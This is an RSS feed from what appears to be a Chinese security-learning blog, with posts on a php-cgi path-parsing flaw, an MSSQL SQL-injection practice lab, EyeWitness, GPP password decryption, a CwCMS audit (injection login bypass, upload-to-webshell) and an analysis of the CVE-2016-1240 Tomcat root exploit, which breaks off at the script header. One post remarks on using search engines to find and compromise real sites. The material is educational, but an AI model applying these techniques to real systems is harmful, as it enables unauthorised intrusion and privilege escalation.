<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Larryxi&#39;s blog - Articles</title>
    <description>Larryxi&#39;s blog,learn security everyday.
</description>
    <link>
    https://larryxi.github.io</link>
    
      
      <item>
        <title>php-cgi 默认配置解析漏洞实践</title>
        
          <description>&lt;h1 id=&quot;x00-&quot;&gt;0x00 背景&lt;/h1&gt;

&lt;p&gt;中午看到&lt;a href=&quot;https://www.leavesongs.com/&quot;&gt;P牛&lt;/a&gt;20分钟拿下WebShell很是崇拜，大家问其究竟得知是&lt;code&gt;xxx.jpg/.php&lt;/code&gt;被解析成php脚本轻松拿下，抱着自愧不如的心理来学习一下。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.80sec.com/nginx-securit.html&quot;&gt;http://www.80sec.com/nginx-securit.html&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.laruence.com/2009/11/13/1138.html&quot;&gt;Nginx(PHP/fastcgi)的PATH_INFO问题&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.laruence.com/2010/05/20/1495.html&quot;&gt;Nginx + PHP CGI的一个可能的安全漏洞&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://nealpoole.com/blog/2011/04/setting-up-php-fastcgi-and-nginx-dont-trust-the-tutorials-check-your-configuration/&quot;&gt;Setting up PHP-FastCGI and nginx? Don’t trust the tutorials: check your configuration!&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;上面的链接主要阐述的是，在Nginx服务器上由于PHP的cgi.fix_pathinfo默认为开启状态，加上Web服务器上没有对应地安全处理最终导致解析漏洞的发生。&lt;/p&gt;

&lt;h1 id=&quot;x01-&quot;&gt;0x01 实践&lt;/h1&gt;

&lt;p&gt;这个漏洞从10年被发现，而如今我测试的php-5.6.25版本中cgi.fix_pathinfo仍为默认开启状态，由于Web安全是个贯穿性的整体，下面就从不同平台上的Web服务器进行测试实践。&lt;/p&gt;

&lt;h2 id=&quot;windows-&quot;&gt;Windows 平台&lt;/h2&gt;

&lt;p&gt;在Windows平台上，运维者如果在搭建好环境后在实际环境中使用默认配置，将请求未做处理就传入php的fastcgi，解析问题就随之而来了。&lt;/p&gt;

&lt;h3 id=&quot;nginx&quot;&gt;Nginx&lt;/h3&gt;

&lt;p&gt;参考&lt;a href=&quot;http://blog.qiji.tech/archives/3092&quot;&gt;这里&lt;/a&gt;搭建好环境，测试漏洞存在：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/2017/02/16/1.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;iis&quot;&gt;IIS&lt;/h3&gt;

&lt;p&gt;IIS服务器在&lt;a href=&quot;http://www.cnblogs.com/haocool/archive/2012/10/14/windows-8-iis-to-configure-php-runtime-environment.html&quot;&gt;搭建&lt;/a&gt;好后，使用fastcgi模块处理php脚本，同样存在问题：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/2017/02/16/2.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;linux-&quot;&gt;Linux 平台&lt;/h2&gt;

&lt;p&gt;在Linux平台下我直接是Ubuntu apt-get 安装的nginx、php和php5-fpm，首先是随便请求一个php文件，浏览器中响应如下：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/2017/02/16/3.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;像这种只是响应很简单的body而不是nginx的404页面，很有可能说明是直接将请求传递到了fastcgi中。（Widnwos平台上也是类似的道理）&lt;/p&gt;

&lt;p&gt;可是在访问&lt;code&gt;http://192.168.1.124/larry.txt/.php&lt;/code&gt;页面时出现了&lt;code&gt;Access denied.&lt;/code&gt;信息拒绝访问，查看error日志和Google一番之后得知php在5.3.9版本中对php-fpm添加了&lt;a href=&quot;https://bugs.php.net/bug.php?id=55181&quot;&gt;security.limit_extensions&lt;/a&gt;选项，防止Web服务的错误配置而带来的php代码执行。所以我在&lt;code&gt;/etc/php5/fpm/pool.d/www.conf&lt;/code&gt;中添加&lt;code&gt;security.limit_extensions = .php .txt&lt;/code&gt;，再重启php5-fpm就能复现解析漏洞了：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/2017/02/16/4.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;apache&quot;&gt;关于Apache&lt;/h2&gt;

&lt;p&gt;一般都说是Apache通过mod_php模块来加载php是不会出现这样的解析问题的，就在想Apache会不会也有fastcgi模块，没想到还真有：&lt;a href=&quot;http://wenku.baidu.com/view/887de969561252d380eb6e92.html&quot;&gt;mod_php VS mod_fastcgi&lt;/a&gt;。所以就在想如果换成mod_fastcgi来配合php会不会出问题，但我从前面的文章中理解到是两个模块都有把请求传递给php-cgi。&lt;/p&gt;

&lt;p&gt;那么“安全”的根源可能在于Apache本身？细翻了一下Apache的官方文档发现&lt;a href=&quot;https://httpd.apache.org/docs/2.4/mod/core.html#acceptpathinfo&quot;&gt;AcceptPathInfo&lt;/a&gt;这个指令，其默认值是Off的，当我们传入&lt;code&gt;/test/here.html/more&lt;/code&gt;的请求时，由于把&lt;code&gt;/more&lt;/code&gt;作为了&lt;code&gt;PATH_INFO&lt;/code&gt;，Apache则会返回404 NOT FOUND error；如果设置为On，则会对之前的请求用&lt;code&gt;/test/here.html&lt;/code&gt;映射有效文件。Apache就这样把我们堵在了寻找PHP的门外。&lt;/p&gt;

&lt;h1 id=&quot;x02-&quot;&gt;0x02 感悟&lt;/h1&gt;

&lt;p&gt;探究这个漏洞久了总感觉似曾相识，最后才恍然大悟是看过的&lt;a href=&quot;http://172.16.24.178/www.owasp.org.cn/OWASP_Training/Upload_Attack_Framework.pdf&quot;&gt;Upload_Attack_Framework&lt;/a&gt;中的内容，当初理解实践地不够深入现在只能再慢慢还了。对比之下我这个探究也“自愧不如”了。&lt;/p&gt;

&lt;p&gt;在Google过程中发现orange大牛在hitcon大会演讲的ppt中也有提到过该问题的相关思考，其中针对某种防御形式的绕过也是蛮有意思的，有兴趣的同学可以&lt;a href=&quot;https://hitcon.org/2015/CMT/download/day1-c-r0.pdf&quot;&gt;瞅瞅&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;比较有意思的是发现在国内某个比较火的php环境集成软件中，也有一键化部署nginx+php的环境，而其中的默认配置不可避免地会被拿下，结合浏览器的关键字
搜索和对应存在上传图片的网站，这样我也能够“20分钟”轻松拿下了：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/2017/02/16/5.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

</description>
        
        <pubDate>Thu, 16 Feb 2017 00:00:00 -0500</pubDate>
        <link>
        https://larryxi.github.io/php-cgi-vuln-practice.html</link>
        <guid isPermaLink="true">https://larryxi.github.io/php-cgi-vuln-practice.html</guid>
      </item>
      
    
      
      <item>
        <title>Nmaprecordsearch And Mssql Sqli Labs</title>
        
          <description>&lt;p&gt;﻿—
title: “NmapRecordSearch &amp;amp;&amp;amp; MSSQL-SQLi-Labs 初步开发小结”
date: 2017-01-11
—&lt;/p&gt;

&lt;h1 id=&quot;x00-&quot;&gt;0x00 前言&lt;/h1&gt;

&lt;p&gt;皮之不存毛将焉附，没有编程的积累也就谈不上是在搞安全了。出于学习和练习编程的目的，之前开发了两个小的项目，都是初步开发还有许多不足要去改善，现将其中的要点记录下来，这两个项目都可以在我的Github上找到：NmapRecordSearch &amp;amp;&amp;amp; MSSQL-SQLi-Labs。&lt;/p&gt;

&lt;h1 id=&quot;x01-nmaprecordsearch&quot;&gt;0x01 NmapRecordSearch&lt;/h1&gt;

&lt;p&gt;这个Nmap结果导入搜索系统是受启发于《黑客秘笈》这本书，我们在实际进行渗透测试时，面对大量的端口扫描结果，我们就需要从其中的短板入手，快速搜索和利用弱点服务就在渗透测试中起着很关键的作用。系统是用经典的bootstrap+php+mysql搭建的，其中的设计要点如下：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;在数据库设计方面，我分了三个数据库表：scan_list记录每一次扫描的原信息，包括制定的project name和id；host_list包含每个host的详细的端口扫描结果；port_list包含每个端口对应的服务名，服务产品，便于后面的搜索。&lt;/li&gt;
  &lt;li&gt;在php代码层面写了一个install的脚本，还有about、record和search页面：record页面可以上传nmap扫描的XML结果并显示，search界面可以指定不同的搜索类型并查看某一ip详细的端口扫描结果：
 &lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20170111/1.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;在前端方面我则是使用bootstrap搭建了一下，凑合着还能看：
 &lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20170111/2.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;后续需要改进的有一下三点：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;需要加上用户登录，打算搞成一个多用户协助的系统&lt;/li&gt;
  &lt;li&gt;代码只是在功能上实现了自己使用的一些功能，安全方面需要加固&lt;/li&gt;
  &lt;li&gt;还需要面对对象来编程&lt;/li&gt;
&lt;/ol&gt;

&lt;h1 id=&quot;x02-mssql-sqli-labs&quot;&gt;0x02 MSSQL-SQLi-Labs&lt;/h1&gt;

&lt;p&gt;这个系统相对于原版的php+mysql架构，用的则是asp+mssql 2000。数据库和代码逻辑层面也大多数是仿造的原版本，而且由于时间精力等原因也是只开发了前面的20关。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20170111/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;asp和php在本质上还是有区别的，所以在开发过程中遇到了一下几个关键点：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;首先就是asp的整体代码编写逻辑，由于asp不支持动态包含文件我只能重复改写多套前端模板；而且对于数据库的报错特性，我只能先设置捕获陷阱，当有报错时再把错误信息写入到页面中：
 &lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20170111/4.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;由于使用到Recordset，不能简单地取出某一列来判断SQL语句是否有查询出结果，而是需要同时判断BOF和EOF才更加合理：
 &lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20170111/5.jpg&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;还有就是由于在SQL Server 2000中QUOTED_IDENTIFIER 为 ON 时，双引号只能用于分隔标识符，不能用于分隔字符串，所以我在某些关卡中进行了替换。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;虽然这个系统是属于练习的弱点系统，但真正有价值的地方还是在于练习的过程，也要抽空好好学习一下。&lt;/p&gt;

</description>
        
        <pubDate>Wed, 11 Jan 2017 00:00:00 -0500</pubDate>
        <link>
        https://larryxi.github.io/nmaprecordsearch-and-mssql-sqli-labs.html</link>
        <guid isPermaLink="true">https://larryxi.github.io/nmaprecordsearch-and-mssql-sqli-labs.html</guid>
      </item>
      
    
      
      <item>
        <title>EyeWitness工具小记</title>
        
          <description>&lt;h1 id=&quot;x00-&quot;&gt;0x00 前言&lt;/h1&gt;

&lt;p&gt;还是在看《黑客秘笈》的时候，比较认同一个观点就是在渗透测试的过程中时间是很重要的，当我们在扫描过一个C段或者是有上百个Web服务需要面对的时候，找到水桶的短板是很最重要的，如果我们人工去一个一个访问判断它是不是武大郎的话就很耗费时间和人力。&lt;/p&gt;

&lt;p&gt;所以书里面就使用Peeping Tom（&lt;a href=&quot;https://bitbucket.org/LaNMaSteR53/peepingtom/&quot;&gt;https://bitbucket.org/LaNMaSteR53/peepingtom/&lt;/a&gt;）这个工具来调用浏览器访问指定的IP和端口，对Web服务进行截图，最后统一汇总到一个页面中，我们就可以挑一些柿子开捏了（Tomcat，JBoss，CMS等一些公开漏洞比较多的框架或软件）。&lt;/p&gt;

&lt;p&gt;实际上当我来准备下载工具试用了时候，看到了作者已停止更新该软件了，并且向大家推荐了另一个更好的孪生兄弟，EyeWitness（&lt;a href=&quot;https://github.com/ChrisTruncer/EyeWitness&quot;&gt;https://github.com/ChrisTruncer/EyeWitness&lt;/a&gt;）。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20161228/1.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;x01-&quot;&gt;0x01 安装&lt;/h1&gt;

&lt;p&gt;EyeWitness的安装比较简单，看github上的README就可以知道，要求系统是Kali2或者Debian 7+，切换到setup目录直接运行setup.sh脚本就行了。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20161228/2.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;x02-&quot;&gt;0x02 使用&lt;/h1&gt;

&lt;p&gt;帮助选线则是如下所示：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20161228/3.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;虽然从选项中都能知道其具体的功能，但官方也专门写了篇文章（&lt;a href=&quot;https://www.christophertruncer.com/eyewitness-2-0-release-and-user-guide/&quot;&gt;https://www.christophertruncer.com/eyewitness-2-0-release-and-user-guide/&lt;/a&gt;）进行介绍，就不赘述了。&lt;/p&gt;

&lt;p&gt;但是当我在Kali2上安装好之后直接运行却出现如下的报错：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20161228/4.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;一查原因（&lt;a href=&quot;http://ju.outofmemory.cn/entry/290716&quot;&gt;http://ju.outofmemory.cn/entry/290716&lt;/a&gt;）应该是firefox的版本太低了，Kali2自带的Iceweasel版本只有38，所以果断卸载装上最新的Firefox（&lt;a href=&quot;https://krasnek-andreas.blogspot.com/2014/02/kali-linux-tutorial-ii-remove-iceweasel.html&quot;&gt;https://krasnek-andreas.blogspot.com/2014/02/kali-linux-tutorial-ii-remove-iceweasel.html&lt;/a&gt;），最后就可以愉快地玩耍了。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20161228/5.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

</description>
        
        <pubDate>Wed, 28 Dec 2016 00:00:00 -0500</pubDate>
        <link>
        https://larryxi.github.io/eyewitness-tool-note.html</link>
        <guid isPermaLink="true">https://larryxi.github.io/eyewitness-tool-note.html</guid>
      </item>
      
    
      
      <item>
        <title>Windows 2008 GPP漏洞学习</title>
        
          <description>&lt;h1 id=&quot;x00-&quot;&gt;0x00 背景&lt;/h1&gt;

&lt;p&gt;在看《黑客秘笈》这本书里，我们攻陷了内网中某个接入域系统的主机，如果是较低的普通用户权限，通常会检查域环境中是否存在GPP漏洞，以此提升至域或本地管理员的权限。&lt;/p&gt;

&lt;p&gt;乌云的这个&lt;a href=&quot;http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0197781.html&quot;&gt;http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0197781.html&lt;/a&gt;渗透案例就用到了此漏洞，我们可以从中窥探一二。&lt;/p&gt;

&lt;h1 id=&quot;x01-&quot;&gt;0x01 简介&lt;/h1&gt;

&lt;p&gt;GPP是指组策略首选项（Group Policy Preference），GPP通过操作组策略对象GPO（Group Policy Object）对域中的资源进行管理。Freebuf的这篇文章&lt;a href=&quot;http://www.freebuf.com/vuls/92016.html&quot;&gt;http://www.freebuf.com/vuls/92016.html&lt;/a&gt;讲了GPP的应用场景和与之对应的安全问题。&lt;/p&gt;

&lt;p&gt;简单来说就是，出于想更新每台主机上本地账户密码的目的，利用GPP可以指定某个域账户为所有计算机的本地计算机管理账户。而这个账号信息存储在&lt;code&gt;\\[Domain Controller]\SYSVOL\[Domain]\Policies&lt;/code&gt;中的某个Grouop.xml中，其中的cpassword为AES加密值。但在AD中的所有用户都可以读取Group.xml，对于AES的对称加密，在微软的MSDN上可以查到cpassword使用的固定秘钥（&lt;a href=&quot;https://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be.aspx&quot;&gt;https://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be.aspx&lt;/a&gt;），这无疑就是在渗透人员面前的裸奔。&lt;/p&gt;

&lt;h1 id=&quot;x02-&quot;&gt;0x02 测试&lt;/h1&gt;

&lt;p&gt;91Ri上的这篇文章&lt;a href=&quot;http://www.91ri.org/14909.html&quot;&gt;http://www.91ri.org/14909.html&lt;/a&gt;有一个整体的测试过程。我们前期可以参考l3m0n的文章&lt;a href=&quot;https://github.com/l3m0n/pentest_study&quot;&gt;https://github.com/l3m0n/pentest_study&lt;/a&gt;搭建域环境。&lt;/p&gt;

&lt;p&gt;实践中需要注意一下，组策略管理编辑器是在右键Defualt Domain Policy选择编辑选项打开的，如图：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20161214/1.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;还有一点就是测试的win7系统在加入域环境后，需要在域控服务器这边添加一个域账号，win7再以此账号登录才可以成功，不然直接去找Group.xml时需要认证，如图：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20161214/2.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;最后测试成功如下图：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20161214/3.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20161214/4.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

</description>
        
        <pubDate>Wed, 14 Dec 2016 00:00:00 -0500</pubDate>
        <link>
        https://larryxi.github.io/windows-2008-gpp.html</link>
        <guid isPermaLink="true">https://larryxi.github.io/windows-2008-gpp.html</guid>
      </item>
      
    
      
      <item>
        <title>CwCMS简单代码审计实践</title>
        
          <description>&lt;h1 id=&quot;x00-&quot;&gt;0x00 背景&lt;/h1&gt;

&lt;p&gt;代码简介：创文企业网站管理系统PHP版（简称CwCMS），采用PHP+MySQL版···在站长之家上的下载地址为：&lt;a href=&quot;http://down.chinaz.com/soft/38317.htm&quot;&gt;http://down.chinaz.com/soft/38317.htm&lt;/a&gt;。该CMS代码量比较少，写得也比较简单，下面就从安全的角度对其审计一番。&lt;/p&gt;

&lt;h1 id=&quot;x01-&quot;&gt;0x01 注入后台绕过&lt;/h1&gt;

&lt;p&gt;admin/index.php处，直接将POST数据带入sql语句，无任何过滤，导致可注入直接登录后台：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20161101/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;对应的cw_admin表中有4列，所以直接union控制对应的密码MD5，轻松登录：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20161101/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;x02-&quot;&gt;0x02 无身份认证垂直越权&lt;/h1&gt;

&lt;p&gt;这个cms在登录了之后就直接信任当前用户，随便看一个admin/cw_user.php增加管理员的功能：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20161101/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在开头没有经过身份再次认证就直接开始代码逻辑，所以可导致垂直越权，直接访问对于url也能增加管理员：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20161101/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;x03-getshell&quot;&gt;0x03 上传文件无验证getshell&lt;/h1&gt;

&lt;p&gt;在admin/info.php的功能中有上传图片的地方，上传处理的代码位于admin/upload.php：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20161101/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这里也没有身份认证就不提了，对于图片的上传没有限制扩展名，只是验证了MIME类型，很基本的就getshell了：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20161101/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;验证一下执行命令：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20161101/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

</description>
        
        <pubDate>Tue, 01 Nov 2016 00:00:00 -0400</pubDate>
        <link>
        https://larryxi.github.io/cwcms-code-audit.html</link>
        <guid isPermaLink="true">https://larryxi.github.io/cwcms-code-audit.html</guid>
      </item>
      
    
      
      <item>
        <title>CVE-2016-1240 Apache Tomcat 本地提权分析</title>
        
          <description>&lt;h1 id=&quot;x00-&quot;&gt;0x00 前言&lt;/h1&gt;

&lt;p&gt;2016-10-03号，在exploit-db上出了&lt;a href=&quot;https://www.exploit-db.com/exploits/40450/&quot;&gt;Apache Tomcat 8/7/6 (Debian-Based Distros) - Privilege Escalation&lt;/a&gt;，也就是CVE-2016-1240 ，基于Debain的Apache Tomcat权限提升，攻击者在获取到tomcatN的shell之后，可以利用Debain系统在使用package安装的tomcat的启动脚本&lt;code&gt;/etc/init.d/tomcatN&lt;/code&gt;中的缺陷，SUID的特性和对&lt;code&gt;geteuid&lt;/code&gt;函数的覆盖，得到可使用的rootshell，达到提升权限的目的。本文将会对exploit脚本进行分析，并搭建环境加以复现&lt;/p&gt;

&lt;h1 id=&quot;x01-&quot;&gt;0x01 脚本缺陷&lt;/h1&gt;

&lt;p&gt;以tomcat7为例，在init脚本&lt;code&gt;/etc/init.d/tomcat7&lt;/code&gt;中&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# Run the catalina.sh script as a daemon&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; +e
touch &lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$CATALINA_PID&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$CATALINA_BASE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;/logs/catalina.out
chown &lt;span class=&quot;nv&quot;&gt;$TOMCAT7_USER&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$CATALINA_PID&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$CATALINA_BASE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;/logs/catalina.out&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;这段脚本主要是root用户在touch了catalina.out文件后，再将文件的所有者改为tomcat7的用户。脚本看似没有什么问题，但是cve的作者提出这么一个场景：当攻击者以tomcat的身份访问服务器的时候（比如说拿下了tomcat服务器的webshell），他就可以将catalina.out替换成指向任意文件的动态链接（软链接），在服务器重启之后（当然，是需要创造这种机会的），init脚本再次以root权限运行，将动态链接所指向的文件的所有者改成了tomcat用户，这样攻击者就可以读写服务器上的任意文件了。正如长亭科技的&lt;a href=&quot;http://mp.weixin.qq.com/s?__biz=MzIwMDk1MjMyMg==&amp;amp;mid=2247483675&amp;amp;idx=1&amp;amp;sn=4b3333c9a16e2e29c6fed72ad45e0787&amp;amp;mpshare=1&amp;amp;scene=1&amp;amp;srcid=1008Gu6ULmhFZ9bHfhaeHCKr#rd&quot;&gt;文章&lt;/a&gt;所分析的，作者并不甘于单纯的文件操作，而是利用SUID和/etc/ld.so.preload的方法获取到root权限的shell&lt;/p&gt;

&lt;h1 id=&quot;x02-&quot;&gt;0x02 环境搭建&lt;/h1&gt;

&lt;p&gt;老生常谈的系统更新就不赘述了，我这里使用Ununtu14.04虚拟机和tomcat7进行测试。问题出现于package中的初始化脚本中，而脚本则是来源于安装时的deb包，虽然可以通过apt-get直接安装tomcat7，但是debian官方及时进行了修复，我们得去下载历史的deb包来安装服务复现环境。在&lt;a href=&quot;http://snapshot.debian.org/&quot;&gt;snapshot&lt;/a&gt;上可以找到历史的deb包，这里我选择安装tomcat 7.0.14-1，过程如下&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget http://snapshot.debian.org/archive/debian/20110521T031913Z/pool/main/t/tomcat7/libservlet3.0-java-doc_7.0.14-1_all.deb
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo dpkg -i libservlet3.0-java-doc_7.0.14-1_all.deb
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo apt-get install libecj-java
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget http://snapshot.debian.org/archive/debian/20110521T031913Z/pool/main/t/tomcat7/libtomcat7-java_7.0.14-1_all.deb
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo dpkg -i libtomcat7-java_7.0.14-1_all.deb
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget http://snapshot.debian.org/archive/debian/20110521T031913Z/pool/main/t/tomcat7/tomcat7-common_7.0.14-1_all.deb
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo dpkg -i tomcat7-common_7.0.14-1_all.deb
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget http://snapshot.debian.org/archive/debian/20110521T031913Z/pool/main/t/tomcat7/tomcat7_7.0.14-1_all.deb
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo dpkg -i tomcat7_7.0.14-1_all.deb&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;都是一些常规的依赖安装，安装好后&lt;code&gt;cat -n /etc/init.d/tomcat7 | less&lt;/code&gt;就可看到存在缺陷的脚本片段了，但是在尝试启动tomcat的时候会报错&lt;code&gt;* no JDK found - please set JAVA_HOME&lt;/code&gt;，起来也要安装jdk环境&lt;code&gt;sudo apt-get install --no-install-recommends openjdk-7-jdk&lt;/code&gt;，再根据&lt;a href=&quot;http://askubuntu.com/questions/154953/specify-jdk-for-tomcat7&quot;&gt;这里&lt;/a&gt;在&lt;code&gt;/etc/default/tomcat7&lt;/code&gt;中加入&lt;code&gt;JAVA_HOME&lt;/code&gt;的环境变量&lt;code&gt;JAVA_HOME=/usr/lib/jvm/java-7-openjdk-amd64&lt;/code&gt;，最后再重启一下tomcat就成功搭建起来了&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20161012/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;服务起来后可以尝试一下长亭文章中的利用缺陷操作系统文件，这里就不多说了&lt;/p&gt;

&lt;h1 id=&quot;x03-&quot;&gt;0x03 脚本分析&lt;/h1&gt;

&lt;p&gt;为了方便说明，请允许我先把脚本贴过来&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Tomcat 6/7/8 on Debian-based distros - Local Root Privilege Escalation Exploit&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# CVE-2016-1240&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Discovered and coded by:&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Dawid Golunski&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# http://legalhackers.com&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# This exploit targets Tomcat (versions 6, 7 and 8) packaging on &lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Debian-based distros including Debian, Ubuntu etc.&lt;/span&gt;
